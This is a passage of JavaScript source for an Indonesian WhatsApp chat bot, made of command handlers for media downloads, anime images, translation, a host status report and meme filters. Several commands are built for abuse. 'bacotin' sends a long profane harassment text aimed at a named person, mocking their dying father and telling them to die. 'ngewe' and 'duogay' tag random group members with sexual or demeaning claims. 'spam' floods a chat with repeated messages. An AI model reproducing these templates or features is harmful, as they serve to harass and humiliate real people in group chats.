𝙍𝙪𝙣𝙩𝙞𝙢𝙚 𝘽𝙤𝙩 : ${kyun(uptime)}`
its = await getBuffer (ppimg)
ikyc.sendMessage(from, teks, text, { thumbnail: its, detecLinks: false, quoted: iky, contextInfo: { forward, externalAdReply:{title: `${pushname}`,body:`${stst}`,previewType:"PHOTO",thumbnail: its, sourceUrl:`https://wa.me/${senderNumber}`}}})
break            
           
           
           
           
           
     
           

           
           
           
           
           
           
           
           
           
          
           
           
           
           
           case 'tekschat':
           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
           teksChat = `${q}`
           setReply(`
Berhasil mengganti teksChat Bot
jika ada yang command ke bot maka bot
akan menjawab : ${q}`)
       break    
           
           
           
    
    
      
      
           
           
        
                 
              
                 
                
            case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                setReply(bi)
                break
            
           
					
					
					
           
           
          

           
           
           case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot1) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        setReply(tekss);
        break;
        



 
 
 
           case 'mediafire': 
                            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return setReply(mess.limit)
                            if (args.length < 1) return setReply('Link Nya Mana? ')
                            if(!isUrl(args[0]) && !args[0].includes('mediafire')) return setReply(mess.error.Iv)
                            setReply(mess.wait)
                            teks = args.join(' ')
                            res = await mediafireDl(teks)
                            result = `Media Fire Downloader

 *Nama :* ${res[0].nama}
 *Ukuran :* ${res[0].size}
 *Link :* ${res[0].link}

 _*Tunggu Proses Mengirim Media......*_`
                         setReply(result)
                         sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: iky})
                         limitAdd(sender, limit)
                         break
           
           
           
           
           
           
					
					
					
					
           case 'kbbi':
					if (args.length < 1) return setReply('Apa yang mau dicari um?')
					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					setReply('Menurut Kbbi:\n\n'+asw.result)
					break
           case "astetick":
    case "videoanime":
    case "storyanime":
    setReply(mess.wait)
     Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
     ikyc.sendMessage(from, Iki, video, {quoted: iky })
     break
           
           
           
           
           
           case 'playvideo':
           case 'playvidio':
             if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (!q) return setReply('Judulnya apa kak ?')
            if(q.includes("youtube.com")) return setReply("Judulnya musiknya aja kak")
           // if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply(mess.error.Iv)
            teks = args.join(' ')
            res = await yts(`${teks}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
            setReply(mess.wait)
            res = await y2mateV(res.all[0].url).catch(e => {
            setReply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${res[0].judul}\`\`\`
\`\`\`🐥 Ext : MP4\`\`\`
\`\`\`🐥 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: iky}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: iky, mimetype: 'video/mp4', filename: res[0].output})
})
            break
           
           
           case 'playaudio':
   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(q.includes("youtube.com")) return setReply("Judulnya musiknya aja kak")
               if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
               teks = args.join(' ')
               setReply('Tunggu bentar kak')
               
               if (!teks.endsWith("-doc")){
               res = await yts(`${teks}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
 
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}


*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: iky, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               setReply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
              
               sendFileFromUrl(res[0].link, audio, {quoted: iky, mimetype: 'audio/mp4', filename: res[0].output})
}
               if (teks.endsWith("-doc")){
               const tec = teks.split("-doc")
               res = await yts(`${tec}`).catch(e => {
               setReply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
        
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
?? ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
??️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}

*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: iky, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               setReply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
      
               sendFileFromUrl(res[0].link, document, {quoted: iky, mimetype: 'audio/mp3', filename: res[0].output})
}

               break          
           case 'spam':
				if (!isOwner && !iky.key.fromMe) return setReply(mess.only.ownerB)
					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split(" ")
				if (!argzi) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return setReply('Kebanyakan!')
				if (isNaN(argzi[1])) return setReply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					ikyc.sendMessage(from, argzi[0], MessageType.text)
				}
				break
case 'tags':
				if (!isOwner && !iky.key.fromMe) return setReply(mess.only.ownerB)
					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return setReply(`Penggunaan ${prefix}tags TagOrang|jumlah`)
				if (Number(argzi[1]) >= 100) return setReply('Kebanyakan!')
				if (isNaN(argzi[1])) return setReply(`Tag Seseorang`)
				for (let i = 0; i < argzi[1]; i++){
					ikyc.sendMessage(from, argzi[0], MessageType.text)
				}
				break         
           
           
           
     
    

      
           
           
                    
                    
           
           
           
           
           case 'kodebahasa':
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
break
           
           
       
           
         
        
           
           

case 'status':
case 'stats':
				var groups = ikyc.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = ikyc.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = ikyc.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalchat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Charged : ${baterai.isCharge}
Mode : ${publik ? 'public' : 'self'}
Prefix : 「 ${prefa} 」
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${ikyc.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${ikyc.user.phone.wa_version}
Os Version: ${ikyc.user.phone.os_version}

⍟ ────────────────── ⍟`

setReply(stamtus)
break
				
           
           
           
           
           
           
           
           
           
           
           
     
           
           
           
           
           
           
           
           
           
           case 'anna':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Anna.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           case 'asunayuki':
           
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)          
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Asuna_yuki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            
            
            
            case 'ayuzawa':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Ayuzawa_misaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'chitoge':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Chitoge_kirisaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'emilia':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Emilia.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           case 'erza':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Erza_scarlet.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           case 'hinata':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Hinata.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            
            
            
            case 'naruto':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Naruto.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
            
            
            
            
            case 'sasuke':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Sasuke.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            ikyc.sendMessage(from,media,image,{quoted:iky,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(sender, limit)
            break
           
           
           
           
           
           case 'translate': case 'tr':
									try {
										if (args.length < 1)return setReply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { setReply(`${res}`) })
											} else {
												tolang = args[0]
												entah = iky.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { setReply(`${res}`) })
												}
											} catch (e) {
												setReply(`${e}`)
												}
											break
           
           
           
           
           
           
           
           
           
           
         
           
           
                   
           
           
          
           
           
           case 'wiki':
if (args.length < 1) return setReply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return setReply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: iky, caption: result}).catch(e => {
  setReply(result)
})
break
                                 
     case 'wasted':
      try{
            if ((isMedia && !iky.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
            owgi = await ikyc.downloadMediaMessage(boij)
            res = await upload(owgi)
            anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${res}`
            setReply(anu1)
            rau = await getBuffer(anu1)
            await ikyc.sendMessage(from, rau, image)
            //sendStickerUrl(from, `${anu1}`)
            } else {
            setReply('kirim/reply gambar/video')
            }
            } catch (err){
            	setReply(err)
            }
            break
            
            case 'wasted2':
      try{
            if ((isMedia && !iky.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
            owgi = await ikyc.downloadMediaMessage(boij)
            res = await upload(owgi) 
            anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${res}`
            setReply(anu1)
            //rau = await getBuffer(anu1)
            await ikyc.sendMessage(from, rau, image)
            sendStickerUrl(from, `${anu1}`)
            } else {
            setReply('kirim/reply gambar/video')
            }
            } catch (err){
            	setReply(err)
            }
            break
 case 'stickwasted':
      try{
            if ((isMedia && !iky.message.videoMessage || isQuotedSticker || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
            owgi = await ikyc.downloadMediaMessage(boij)
            res = await upload(owgi) 
            lonte = `https://some-random-api.ml/canvas/wasted?avatar=${res}`
            setReply(lonte)
            sendStickerUrl(from, lonte)
            } else {
            setReply('kirim/reply gambar/video')
            }
            } catch (err){
            	setReply(err)
            }
            break           
            
            case 'ytcomment':
uh = await ikyc.getProfilePicture(sender)
res = await upload(uh)
link = `https://some-random-api.ml/canvas/youtube-comment?username=${pushname}&comment=${q}&avatar=${res}?q=60&dark=true%E2%80%8B`
buffer = await getBuffer(link)
ikyc.sendMessage(from, buffer, image, {quoted: iky})
//sendFileFromUrl(link, image, {quoted: iky})
break    
              



    case 'gura':
                case 'gurastick':{

                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]                    
                    sendStickerUrl(from, wifegerakx)

                    }
                    break          

 case 'get':
case 'fetch':
            if(!q) return setReply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            })   
            break
        
        


        
        
        
           //By yudha perdana
           case 'wangy':
              if (!q) return setReply('query')
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              ikyc.sendMessage(from, awikwok, text)
              break
           case 'bacotin':
              if (!q) return setReply('query')
              tt = q.toUpperCase()
              memel = `Oy ${tt} Oy ${tt} Oy ${tt} BINATANG LU SADAR GA SIH ${tt} MUKA LU KEK BABI ANJING Sadar Lah Sadar Diri ${tt} 😎Udah Gede Malah Jadi Beban Keluarga ${tt} Hadeh Ngentod Juga Lu ini ${tt} MENDING NIH YA DARI PADA LU COLI DOANH D RUMAH UDAH KAYA ANAK HARAM ${tt}🐖 \n\nMENDING lu Bantu Bapak Lu Noh Bapak Lu Sekarat Bego Mending LU BANTUIN DIA ${tt} MAKSD GW BANTUIN gali Kubur Dia Yahahhaha ${tt} ${tt} Ohiya Ga lama Lagi Sih keknya BAPAK LU DI TANEM ${tt}🗣️ \n\n EH iya Maaf Gw kan Bot Gabole Kasa TAPI KALO KE SI ${tt} Terobos Ajalah kontol Kan dia Udah mau Jadi Anak Y-TEAM ${tt}🖕 \n\nYAHAHHAAH ${tt} ADUH KASIAN GUA LIAT LU UDAH KAYA ORANG BEGO MUNGUT SAMPAH DI DEPAN RUMAH GW hadeh Mending lu ${tt} Ya Kocokin Kontol Kuda Aja Bego Biar hidup lu berguna meiku ${tt}🐒 \n\nHadeh lu ini Mancing Emosi aja ${tt} Lu Itu Sadar Bego Lu cuma lulusan SLB HAHAHA ${tt} SKILL GADA COLI KENCENG UDAH MATI AJA LO KONTOL BIADAB GAUSA SO KERAS MEMEK ${tt}🪚 \n\nAPA G SOR ? PC BEWAN ${tt} TP KL LU bego Maen Hago aja ahahahahah Ga sudi gw by one ama ampas kelapa Wkkwwk Dah lah Nanti Lu baper lu Kan baperan ${tt}🖇️ \n\nKek cewe Makanya Lu anak Haram ahahhaa`
              memel = `Oy ${tt} Oy ${tt} Oy ${tt} BINATANG LU SADAR GA SIH ${tt} MUKA LU KEK BABI ANJING Sadar Lah Sadar Diri ${tt} 😎Udah Gede Malah Jadi Beban Keluarga ${tt} Hadeh Ngentod Juga Lu ini ${tt} MENDING NIH YA DARI PADA LU COLI DOANH D RUMAH UDAH KAYA ANAK HARAM ${tt}🐖 \n\nMENDING lu Bantu Bapak Lu Noh Bapak Lu Sekarat Bego Mending LU BANTUIN DIA ${tt} MAKSD GW BANTUIN gali Kubur Dia Yahahhaha ${tt} ${tt} Ohiya Ga lama Lagi Sih keknya BAPAK LU DI TANEM ${tt}🗣️ \n\n EH iya Maaf Gw kan Bot Gabole Kasa TAPI KALO KE SI ${tt} Terobos Ajalah kontol Kan dia Udah mau Jadi Anak Y-TEAM ${tt}🖕 \n\nYAHAHHAAH ${tt} ADUH KASIAN GUA LIAT LU UDAH KAYA ORANG BEGO MUNGUT SAMPAH DI DEPAN RUMAH GW hadeh Mending lu ${tt} Ya Kocokin Kontol Kuda Aja Bego Biar hidup lu berguna meiku ${tt}🐒 \n\nHadeh lu ini Mancing Emosi aja ${tt} Lu Itu Sadar Bego Lu cuma lulusan SLB HAHAHA ${tt} SKILL GADA COLI KENCENG UDAH MATI AJA LO KONTOL BIADAB GAUSA SO KERAS MEMEK ${tt}🪚 \n\nAPA G SOR ? PC BEWAN ${tt} TP KL LU bego Maen Hago aja ahahahahah Ga sudi gw by one ama ampas kelapa Wkkwwk Dah lah Nanti Lu baper lu Kan baperan ${tt}🖇️ \n\nKek cewe Makanya Lu anak Haram ahahhaa`
              ikyc.sendMessage(from, memel, text)
              break
           
           
           
           
           
           
              case 'yts':
              case 'ytsearch':
              if (!q) return setReply('Format salah')
              setReply('Tunggu sebentar')
              try {
              res = await yts(q)
              a = `*Youtube Search 🔎*\n`
for (let i of res.all) {
a += `
📜 Title : ${i.title}
??️ Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: iky, thumbnail: Buffer.alloc(0), caption: b, contextInfo: forward})
               } catch (e) {
               console.log(e)
               setReply(`${e}`)
}
               break
           
           
           
           
           
 
           
           

           case 'd':
				case 'del':
				case 'delete':
				if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return setReply("Untuk menghapus reply pesan botnya")
				if(!isQuotedReply) return setReply("Reply pesan bot")
				premnih = iky.message.extendedTextMessage.contextInfo.participant
                
					ikyc.deleteMessage(from, { id: iky.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					
					break
           
           
           
           
				
		
           
          
           
           
           
           
           
           case 'jadian':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           if(!isGroup) return setReply("Ga mau ah, lu jelek")
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					limitAdd(sender, limit)
					break
case 'duotolol': case 'duobucin': case 'duogay': case 'duolesbi': 
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           if(!isGroup) return setReply("Ga mau ah, lu jelek")
					jdp = []
					const jgh = groupMembers
					const kos = groupMembers
					const akul = jgh[Math.floor(Math.random() * jgh.length)]
					const dial = kos[Math.floor(Math.random() * kos.length)]
					teks = `${command} Jatuh Ke Pada @${akul.jid.split('@')[0]} & @${dial.jid.split('@')[0]} `
					jdp.push(akul.jid)
					jdp.push(dial.jid)
					mentions(teks, jdp, true)
					limitAdd(sender, limit)
					break
	
case 'ngewe':
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isGroup) return setReply("Maap om aku masih blom cukup umur")
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					limitAdd(sender, limit)
					break
           
           
				

				

			

           
           case 'memeindo':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           data = fs.readFileSync('./lib/game/memeindo.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           buffer = await getBuffer(randKey.result)
           ikyc.sendMessage(from, buffer, image, {quoted : iky, caption : "Nih"})
           limitAdd(sender, limit)
           break
           
           
           
           
           case 'quotes1':
           data = fs.readFileSync('./lib/game/quotes.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           quotes = randKey.quotes
           ikyc.sendMessage(from, quotes, text, {quoted : iky})
           break           
           case 'diem':
			     if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
                if (isMuted) return setReply(`*aku udah diem nih*`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                setReply( `Baik kak 😥 `)
                break
                
                case 'udah':
      if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                setReply(`Oke kak 😁`)
            break     
                    case 'katailham':  
                       if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
					ikyc.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: iky })
					limitAdd(sender, limit)
					break
					
					case 'bucins':
		            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
